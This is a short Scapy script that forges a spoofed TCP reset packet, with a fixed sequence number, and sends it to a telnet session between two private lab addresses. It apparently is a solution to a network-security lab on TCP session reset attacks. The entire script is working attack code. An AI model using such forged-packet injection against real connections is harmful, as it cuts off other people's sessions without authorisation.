from scapy.all import *
ip  = IP(src="10.9.0.6", dst="10.9.0.7")
tcp = TCP(sport=56604, dport=23, flags="R", seq=2041647768)
pkt = ip/tcp
ls(pkt)
send(pkt, verbose=0)